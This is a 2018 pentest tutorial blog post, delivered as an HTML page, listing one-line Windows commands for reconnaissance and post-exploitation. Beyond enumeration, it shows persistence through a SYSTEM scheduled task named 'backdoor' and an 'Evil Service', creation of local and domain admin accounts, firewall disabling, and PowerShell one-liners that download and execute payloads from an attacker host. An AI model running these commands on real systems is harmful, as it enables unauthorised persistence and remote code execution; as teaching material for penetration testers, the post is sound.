@@ -1,0 +1,351 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A Pathetic Soul, ">
+
+
+        <title>A few one line tips // A Pathetic Soul // </title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/theme/css/pure.css">
+    <link rel="stylesheet" href="/theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="/author/engin-demirbilek.html" title="See posts by Engin Demirbilek">
+                </a>
+                <h2 class="article-info">Engin Demirbilek</h2>
+                <small class="about-author"></small>
+                <h5>Published</h5>
+                <p>Tue 03 July 2018</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>A few one line tips</h1>
+                        <p class="post-meta">
+                            // under                         </p>
+                </header>
+            </section>
+            <p>During pentest processes gathering information about systems are very essential.
+Here is the few commands that i personally use frequently due to gathering information about Microsoft Architectures;</p>
+<p><strong>Notice That</strong>: You can get more information about commands that we will use in this article by typing <code>help commandname</code> or <code>commandname \?</code>
+<br>
+<br></p>
+<p><strong>Information Gathering About Local System</strong></p>
+<p>For detecting Network adapters, IP adresses, DNS server:</p>
+<div class="highlight"><pre><span></span>C:\Users\Hyaloid&gt;ipconfig /all
+
+        --code snippet--
+   IPv4 Address. . . . . . . . . . . : 10.0.0.43
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.0.10.100
+   DNS Servers . . . . . . . . . . . : 10.0.0.1
+        --code snippet--
+</pre></div>
+
+
+<p><br>
+Gathering information about open ports(detecting services which only runs in local): </p>
+<div class="highlight"><pre><span></span>C:\Users\Hyaloid&gt;netstat -anot
+
+ Proto  Local Address          Foreign Address        State           PID      Offload State
+
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       536      InHost
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4        InHost
+  TCP    0.0.0.0:902            0.0.0.0:0              LISTENING       3800     InHost
+  TCP    0.0.0.0:912            0.0.0.0:0              LISTENING       3800     InHost
+  TCP    0.0.0.0:1536           0.0.0.0:0              LISTENING       680      InHost
+  TCP    0.0.0.0:1537           0.0.0.0:0              LISTENING       1272     InHost
+  TCP    0.0.0.0:1538           0.0.0.0:0              LISTENING       1784     InHost
+  TCP    0.0.0.0:1539           0.0.0.0:0              LISTENING       760      InHost
+  TCP    0.0.0.0:1540           0.0.0.0:0              LISTENING       3216     InHost
+                --code snippet--
+</pre></div>
+
+
+<p><br></p>
+<p>Gathering information about tasks &amp; killing tasks(if you have enough privilege to do);</p>
+<div class="highlight"><pre><span></span>C:\Users\Hyaloid&gt;tasklist
+    --Shows All Tasks running--
+    --Code Snippet--
+
+C:\Users\Hyaloid&gt;tasklist /FI &quot;PID eq 4372&quot; --Finding procces which PID is equal to 4372--
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+TeamViewer_Service.exe        4372 Services                   0     17.568 K
+
+C:\WINDOWS\system32&gt;tasklist /FI &quot;USERNAME eq NT AUTHORITY\SYSTEM&quot; /FI &quot;STATUS eq running&quot; --Finding procces which runs as NT Authority--
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+csrss.exe                      688 Console                    1     13.456 K
+NVDisplay.Container.exe       1876 Console                    1     23.504 K
+
+C:\WINDOWS\system32&gt;taskkill /F /FI &quot;PID eq 4372&quot; --Killing procces which PID is equal to 4372--
+SUCCESS: The process with PID 4372 has been terminated.
+</pre></div>
+
+
+<p><br>
+Gathering information about system (OS Name, Version, Type, Installed Hotfixes etc.):</p>
+<div class="highlight"><pre><span></span>C:\Users\Hyaloid&gt;systeminfo
+
+    --code snippet--
+OS Name:                   Microsoft Windows 10 Education
+OS Version:                10.0.15063 N/A Build 15063
+    --code snippet--
+System Type:               x64-based PC
+    --code snippet--
+Hotfix(s):                 4 Hotfix(s) Installed.
+                           [01]: KB4022405
+                           [02]: KB4025376
+                           [03]: KB4038806
+                           [04]: KB4040724
+    --code snippet--
+</pre></div>
+
+
+<p><br>
+Gathering scheduled tasks &amp; creating scheduled tasks (you must be administrator):</p>
+<div class="highlight"><pre><span></span>C:\WINDOWS\system32&gt;schtasks
+
+        --code snippet--
+Folder: \
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Adobe Acrobat Update Task                10.07.2018 01:00:00    Ready
+Adobe Flash Player NPAPI Notifier        14.07.2018 03:01:00    Ready
+        --code snippet--
+Folder: \Microsoft\Windows\ApplicationData
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+appuriverifierdaily                      10.07.2018 03:00:00    Ready
+appuriverifierinstall                    14.07.2018 03:00:00    Ready
+CleanupTemporaryState                    N/A                    Ready
+DsSvcCleanup                             N/A                    Ready
+        --code snippet--
+
+C:\WINDOWS\system32&gt;schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn backdoor /tr &quot;\&quot;C:\\Users\\Hyaloid\\backdoor.exe\&quot;&quot;
+</pre></div>
+
+
+<p><br>
+Finding, adding, deleting users and groups &amp; gathering information about spesific user and group: </p>
+<div class="highlight"><pre><span></span>C:\WINDOWS\system32&gt;net users
+    --code snippet--
+-------------------------------------------------------------------------------
+Administrator            Guest                    Hyaloid
+DefaultUser
+
+C:\WINDOWS\system32&gt;net localgroup
+    --code snippet--
+*__vmware__
+*Administrators
+*Backup Operators
+*Cryptographic Operators
+*Distributed COM Users
+    --code snippet--
+
+C:\WINDOWS\system32&gt;net users pentest Password1 /add
+Command completed successfully.
+
+
+C:\WINDOWS\system32&gt;net localgroup &quot;Administrators&quot; pentest /add
+Command completed successfully.
+
+C:\WINDOWS\system32&gt;net users pentest /del
+Command completed successfully.
+
+C:\WINDOWS\system32&gt;net users pentest Password1 /add /DOMAIN (for adding user to domain)
+Command completed sucessfully.
+
+C:\WINDOWS\system32&gt;net group &quot;Domain Admins&quot; pentest /DOMAIN /add (Only could be used by Domain Admin)
+Command completed succesfully
+
+C:\WINDOWS\system32&gt;net users hyaloid
+        --code snippet--
+
+Local Group Memberships                   *Administrators
+                                          *Performance Log Users
+Global Group memberships                  *None
+        --code snippet--
+</pre></div>
+
+
+<p><br>
+Information gathering about services:</p>
+<div class="highlight"><pre><span></span>C:\&gt;sc query
+    --code snippet--
+SERVICE_NAME: SQLWriter
+DISPLAY_NAME: SQL Server VSS Writer
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+SERVICE_NAME: SSDPSRV
+DISPLAY_NAME: SSDP Bulma
+        TYPE               : 30  WIN32
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+        --code snippet--
+
+C:\&gt;sc query state= inactive //stopped services
+    --code snippet--
+</pre></div>
+
+
+<p><br>
+Starting, stopping, deleting and editing services:</p>
+<div class="highlight"><pre><span></span>C:\&gt;sc create &quot;Evil Service&quot; binPath= &quot;C:\Hyaloid\evil.exe&quot; start= auto
+C:\&gt;sc start &quot;Evil Service&quot; //start
+C:\&gt;sc stop &quot;Evil Service&quot; //stop
+C:\&gt;sc config &quot;Evil Service&quot; binPath= &quot;C:\Users\Hacker\Desktop\evil.exe&quot; start= manuel //edit
+C:\&gt;sc delete &quot;Evil Service&quot; //delete
+</pre></div>
+
+
+<p><br>
+Checking file permissions:</p>
+<div class="highlight"><pre><span></span>C:\&gt;icacls &quot;C:\Users\Hyaloid\AppData\Local\Temp&quot;
+C:\Users\Hyaloid\AppData\Local\Temp Everyone:(OI)(CI)(F)
+                                    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+</pre></div>
+
+
+<p><br>
+Playing with firewall configutions:</p>
+<div class="highlight"><pre><span></span>PS C:\WINDOWS\system32&gt; netsh advfirewall show currentprofile
+
+Private Profile Settings:
+----------------------------------------------------------------------
+State                                 ON
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Enable
+        --code snippet--
+
+PS C:\WINDOWS\system32&gt; netsh advfirewall set currentprofile state off  //You can change profile to domainprofile.
+Ok. 
+</pre></div>
+
+
+<p>Downloading files to target system via powershell:</p>
+<div class="highlight"><pre><span></span>C:\&gt;powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.103/evil.exe&#39;,&#39;C:\Users\Hyaloid\Downloads\evil.exe&#39;)
+</pre></div>
+
+
+<p><br>
+Downloading and executing .ps1 files via powershell (you can use this to execute malicious powershell files on target):</p>
+<div class="highlight"><pre><span></span>powershell.exe “IEX (New-Object  Net.WebClient).DownloadString(‘http://evilhost/Malicious.ps1’)&quot;
+</pre></div>
+
+
+<p><br>
+<strong>Microsoft Domain Structer Enumeration</strong>
+<br></p>
+<p>In order to gather information about Domain structers, i personally use an excellent and simple tool called <a href="https://github.com/ropnop/windapsearch">windapsearch</a>.
+Its uses LDAP queries to extract information about <strong>users</strong>, <strong>groups</strong> and <strong>computers</strong>.</p>
+<p>Here is an example taken from its README file;</p>
+<div class="highlight"><pre><span></span>root@kali:~/windapsearch# ./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 --da
+[+] No DC IP provided. Will try to discover via DNS lookup.
+[+] Using Domain Controller at: 172.16.13.10
+[+] Getting defaultNamingContext from Root DSE
+[+]     Found: DC=lab,DC=ropnop,DC=com
+[+] Attempting bind
+[+]     ...success! Binded as:
+[+]      u:ROPNOP\ldapbind
+[+] Attempting to enumerate all Domain Admins
+[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=lab,DC=ropnop,DC=com
+[+]     Found 12 Domain Admins:
+
+cn: Administrator
+
+cn: Andy Green
+userPrincipalName: agreen@lab.ropnop.com
+
+cn: Natasha Strong
+userPrincipalName: nstrong@lab.ropnop.com
+
+cn: Linda Alton
+userPrincipalName: lalton@lab.ropnop.com
+</pre></div>
+
+
+<p><br>
+And also a few metasploit modules that you can use to gather information about domain;</p>
+<div class="highlight"><pre><span></span>post/windows/gather/enum_domain
+post/windows/gather/enum_domain_group_users
+post/windows/gather/enum_domain_users
+post/windows/gather/enum_domains
+post/windows/gather/enum_ad_computers
+</pre></div>
+
+
+<p><br>
+Of course this techniques are not all of techniques that pentesters may use in order to gather information but at least i can say that im using these techniques for sure.</p>
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<footer class="footer">
+    <p>&copy; A Pathetic Soul &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+</body>
+</html>
